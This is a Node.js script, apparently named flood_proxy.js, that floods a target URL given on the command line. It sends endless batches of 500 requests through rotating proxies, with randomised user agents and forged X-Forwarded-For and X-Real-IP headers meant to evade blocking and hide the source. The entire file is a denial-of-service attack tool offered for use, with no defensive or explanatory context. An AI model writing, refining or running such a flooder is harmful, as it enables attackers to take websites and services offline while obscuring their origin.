const axios = require('axios');
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');

const target = process.argv[2];
if (!target) {
  console.error('Usage: node flood_proxy.js <target_url>');
  process.exit(1);
}

// Load user-agents
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Load proxies
let proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(Boolean);
let proxyIndex = 0;

function getNextProxy() {
  const proxy = proxies[proxyIndex % proxies.length];
  proxyIndex++;
  return proxy;
}

// Spoofed headers
function getSpoofedHeaders() {
  const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
  return {
    'User-Agent': ua,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'X-Forwarded-For': randomIP(),
    'X-Real-IP': randomIP(),
  };
}

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

async function sendSpoofedRequest(id) {
  let working = false;
  let attempts = 0;

  while (!working && attempts < proxies.length) {
    const proxy = getNextProxy();
    const agent = new HttpsProxyAgent(`http://${proxy}`);
    attempts++;

    try {
      const res = await axios.get(target, {
        headers: getSpoofedHeaders(),
        timeout: 10000,
        httpAgent: agent,
        httpsAgent: agent,
        validateStatus: () => true,
      });

      if (res.status === 200) {
        console.log(`[#${id}] Success via proxy ${proxy} (${res.status})`);
        working = true;
      } else {
        console.log(`[#${id}] Bad status ${res.status} via proxy ${proxy}, retrying...`);
      }

    } catch (err) {
      console.log(`[#${id}] Proxy ${proxy} failed (${err.message}), retrying...`);
    }
  }

  if (!working) {
    console.log(`[#${id}] Failed to send after trying all proxies.`);
  }
}

async function startFlood() {
  let count = 0;

  while (true) {
    const batch = [];

    for (let i = 0; i < 500; i++) {
      count++;
      batch.push(sendSpoofedRequest(count));
    }

    Promise.allSettled(batch);

    console.log(`> 500 Requests Attempted! Total Tries: ${count}`);
  }
}

startFlood();
